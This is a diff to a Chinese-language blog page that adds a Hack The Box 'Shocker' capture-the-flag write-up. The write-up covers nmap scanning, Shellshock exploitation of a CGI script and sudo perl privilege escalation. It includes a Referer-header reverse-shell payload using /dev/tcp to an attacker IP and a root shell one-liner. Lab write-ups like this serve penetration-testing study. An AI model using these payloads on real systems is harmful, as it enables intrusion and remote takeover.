@@ -63,20 +63,23 @@ document.addEventListener('DOMContentLoaded', function () {
 <h1 id="写点啥儿">写点啥儿</h1>
 <h1 id="">-</h1>
 <h1 id="-v2">-</h1>
-<h1 id="OSCP-BATTLE">[ OSCP BATTLE ]</h1>
+<h1 id="OSCP-BATTLE"><strong>[ OSCP BATTLE ]</strong></h1>
 <ul>
-<li><a href="/oscp/At-The-Beginning">写在开始</a></li>
+<li><a href="/oscp/In-The-Beginning">In The Beginning</a></li>
 </ul>
 <h2 id="Prepration">Prepration</h2>
 <ul>
 <li><a href="/oscp/KALI-Deploy">KALI Deploy</a></li>
+<li><a href="/oscp/Training-Plan">Training Plan</a></li>
 </ul>
 <h2 id="Note">Note</h2>
 <ul>
 <li><a href="/oscp/Nmap-Tips">Nmap Tips</a></li>
+<li><a href="/oscp/Version-Compare">Version Compare</a></li>
+<li><a href="/oscp/Linux-Priv-Esc">Linux Priv Esc</a></li>
 </ul>
 <h1 id="-v3">-</h1>
-<h1 id="Hack-The-Box-Writeup">[ Hack The Box Writeup ]</h1>
+<h1 id="Hack-The-Box-Writeup"><strong>[ Hack The Box Writeup ]</strong></h1>
 <ul>
 <li><a href="/htb/HTB-Environment">HTB Environment</a></li>
 </ul>
@@ -84,13 +87,14 @@ document.addEventListener('DOMContentLoaded', function () {
 <ul>
 <li><a href="/htb/htb-linux/Lame-Writeup">Lame Writeup</a></li>
 <li><a href="/htb/htb-linux/Shocker-Writeup">Shocker Writeup</a></li>
+<li><a href="/htb/htb-linux/Bashed-Writeup">Bashed Writeup</a></li>
 </ul>
 <h2 id="HTB-Windows">HTB Windows</h2>
 <ul>
 <li><a href="/">nothing here</a></li>
 </ul>
 <h1 id="-v4">-</h1>
-<h1 id="Cyber-Security">[ Cyber Security ]</h1>
+<h1 id="Cyber-Security"><strong>[ Cyber Security ]</strong></h1>
 <h2 id="Skills">Skills</h2>
 <ul>
 <li><a href="/">skills</a></li>
@@ -100,7 +104,7 @@ document.addEventListener('DOMContentLoaded', function () {
 <li><a href="/">vuls</a></li>
 </ul>
 <h1 id="-v5">-</h1>
-<h1 id="Essay">[ Essay ]</h1>
+<h1 id="Essay"><strong>[ Essay ]</strong></h1>
 <ul>
 <li><a href="/">该做题了</a></li>
 </ul>
@@ -163,9 +167,95 @@ function sidebar_toggle() {
           <div class="book-post">
   <h1 id="Shocker-Writeup">Shocker Writeup</h1>
 <p><img src="./1.png" alt=""></p>
-<h2 id="0x00-写在前面">0x00 写在前面</h2>
 <h2 id="0x01-信息收集">0x01 信息收集</h2>
+<p>就给一个 IP，不扫端口你还能咋地，<code>nmap</code> 走起来。</p>
+<h3 id="1、TCP-Scan">1、TCP Scan</h3>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span><span class="token class-name">A</span> <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span>oA nmap<span class="token operator">/</span>tcp <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.56</span></code></pre>
+<p>发现两个开放端口。</p>
+<ul>
+<li><strong>80</strong>: apache 2.4.18，可能是漏洞版本，开放了 web 页面，title 无</li>
+<li><strong>2222</strong>: OpenSSH 7.2p2，操作系统为 ubuntu linux</li>
+</ul>
 <p><img src="./2.png" alt=""></p>
+<h3 id="2、UDP-Scan">2、UDP Scan</h3>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span>sU <span class="token operator">-</span><span class="token class-name">A</span> <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span>oA nmap<span class="token operator">/</span>udp <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.56</span></code></pre>
+<p>无结果。</p>
+<p><strong>共开放了 <code>tcp 80、2222</code> 端口。</strong></p>
+<h2 id="0x02-漏洞利用">0x02 漏洞利用</h2>
+<p>根据端口逐一突破。</p>
+<h3 id="1、Port-80">1、Port 80</h3>
+<p>Google 和 nmap 找了 apache 2.4.18 漏洞，无结果，目前只能从 web 入手。<br>
+80端口，web 应用，浏览器打开，就一个首页带个图片，没有功能按钮，看了下 console 没有什么提示，翻了下主页 html 也无发现。</p>
+<p><img src="./3.png" alt=""></p>
+<p>目前为止没有入口，只能先扫下目录，用 dirbuster 跑默认字典，只有这几个结果。</p>
+<p><img src="./4.png" alt=""><br>
+<strong>- icon</strong>: 图片目录<br>
+<strong>- cgi-bin</strong>: 通用网关接口，可能存在 cgi 漏洞</p>
+<p>cgi 使得用户可以通过浏览器执行脚本，这里需要找到具体的脚本路径，一般脚本位于 <code>/cgi-bin/*</code>，以此为 url 基础再跑一次扫描，限制后缀为 <code>.php,.sh,.py,.cgi,.pl</code></p>
+<p><img src="./5.png" alt=""></p>
+<p>发现存在脚本，路径为 <code>/cgi-bin/user.sh</code></p>
+<h4 id="手工利用">手工利用</h4>
+<p>浏览器打开 <code>http://10.10.10.56/cgi-bin/user.sh</code>，burpsuite 抓包，会下载一个 <code>user.sh</code>（不知有何卵用）。<br>
+<img src="./17.png" alt=""></p>
+<p>根据 cgi 漏洞，会在请求头里传递一个函数，后面跟着要执行的命令，构造方式比较复杂，懒得构造的我借助一下 <code>nmap</code>。<br>
+查过漏洞后知道有个代号叫 <code>shellshock</code>，正好也跟盒子名呼应，可以根据这个去查。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/nmap/scripts
+ll <span class="token operator">|</span> <span class="token function">grep</span> shellshock</code></pre>
+<p><img src="./6.png" alt=""><br>
+不知道这个代号也没关系，通过关键字一样查，根据 url 参数，发现一个匹配的。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/nmap/scripts
+<span class="token function">grep</span> <span class="token string">"cgi-bin"</span> -R ./ <span class="token operator">|</span> <span class="token function">grep</span> -v cve</code></pre>
+<p><img src="./7.png" alt=""></p>
+<p>从脚本内容中找到 usage。</p>
+<p><img src="./8.png" alt=""><br>
+使用脚本打一下漏洞，地址指向 <code>burpsuite:8080</code>，同时配置 <code>burpsuite:8080</code> 重定向到靶机 <code>10.10.10.56:80</code>，这样扫描流量就会经过 burp 留下记录，方便后续调试。</p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span>sV <span class="token operator">-</span>p8080 <span class="token operator">--</span>script http<span class="token operator">-</span>shellshock <span class="token operator">--</span>script<span class="token operator">-</span>args uri<span class="token operator">=</span><span class="token operator">/</span>cgi<span class="token operator">-</span>bin<span class="token operator">/</span>user<span class="token punctuation">.</span>sh<span class="token punctuation">,</span>cmd<span class="token operator">=</span>ls <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></code></pre>
+<p><img src="./9.png" alt=""><br>
+纳尼，没有扫出来？!</p>
+<p><img src="./10.png" alt=""><br>
+不慌，先看下具体请求。这里在三个 header 中注入了 sh 命令，执行结果在响应中可见，存在 RCE。</p>
+<p><img src="./11.png" alt=""></p>
+<blockquote>
+<h4 id="格式的坑">格式的坑</h4>
+<p>注意到下面还有条记录，执行 <code>ls</code> 返回 <code>500</code> 异常，这里经过调查发现有几个格式的坑，格式没对就不会回显或报异常。<br>
+此处因为 nmap 脚本有 bug，payload 少了一个 echo 导致扫描异常。</p>
+<p><img src="./12.png" alt=""></p>
+<ul>
+<li>想正常回显，<code>() &#123; :;&#125;;</code> 后面一定要先跟 <code>echo;</code>，再接上命令比如 <code>/bin/ls</code></li>
+<li>命令一定要用绝对路径，比如 <code>ls</code> 要改成 <code>/bin/ls</code></li>
+</ul>
+<p>所以这里正确构造应该是：<code>() &#123; :;&#125;; echo; /bin/ls /</code>。</p>
+<p><img src="./13.png" alt=""><br>
+修改 nmap 脚本，把当 “cmd 为空” 时的 <code>echo;</code> 挪到下面。</p>
+<p><img src="./18.png" alt=""><br>
+<img src="./19.png" alt=""><br>
+以 <code>whoami</code> 测试，返回用户名 <code>shelly</code>，扫描功能正常。</p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span>sV <span class="token operator">-</span>p8080 <span class="token operator">--</span>script http<span class="token operator">-</span>shellshock <span class="token operator">--</span>script<span class="token operator">-</span>args uri<span class="token operator">=</span><span class="token operator">/</span>cgi<span class="token operator">-</span>bin<span class="token operator">/</span>user<span class="token punctuation">.</span>sh<span class="token punctuation">,</span>cmd<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>whoami <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></code></pre>
+<p><img src="./20.png" alt=""></p>
+</blockquote>
+<p>综上所述，kali 监听 4444，发送反弹 shell 命令，获取到 <code>普通用户 shelly</code> 权限。</p>
+<pre class="language-text" data-language="text"><code class="language-text">GET &#x2F;cgi-bin&#x2F;user.sh HTTP&#x2F;1.1
+Referer: () &#123; :;&#125;; echo;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.2&#x2F;4444 0&gt;&amp;1
+Host: localhost:8080
+Connection: close</code></pre>
+<p><img src="./14.png" alt=""></p>
+<blockquote>
+<p><strong>MSF</strong><br>
+比较简单啦，晚点再补充。</p>
+</blockquote>
+<h3 id="2、Port-2222">2、Port 2222</h3>
+<p>没研究 233</p>
+<h2 id="0x03-提权">0x03 提权</h2>
+<p>先检查 sudo 权限表配置 <code>sudo -l</code>，发现可以免密执行 <code>perl</code> 脚本，得。</p>
+<p><img src="./15.png" alt=""><br>
+在刚刚 <code>shell</code> 中 sudo 执行一句话 perl <code>/bin/bash</code>，获得 root 权限。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> perl -e <span class="token string">'exec("/bin/bash")'</span></code></pre>
+<p><img src="./16.png" alt=""></p>
+<h2 id="0x04-攻击节点">0x04 攻击节点</h2>
+<h4 id="端口扫描-目录扫描-80-cgi-bin-shellshock-shelly-sudo-配置不当提权-root">端口扫描 -&gt; 目录扫描 -&gt; 80.cgi-bin(shellshock)(shelly) -&gt; sudo 配置不当提权(root)</h4>
+<h2 id="0x05-学到什么">0x05 学到什么</h2>
+<h4 id="1、对付-web-应用，没有入口的时候爬目录">1、对付 web 应用，没有入口的时候爬目录</h4>
+<h4 id="2、提权先考虑-sudo-配置不当，或利用-sudo-相关提权漏洞">2、提权先考虑 sudo 配置不当，或利用 sudo 相关提权漏洞</h4>
 
 </div>
 
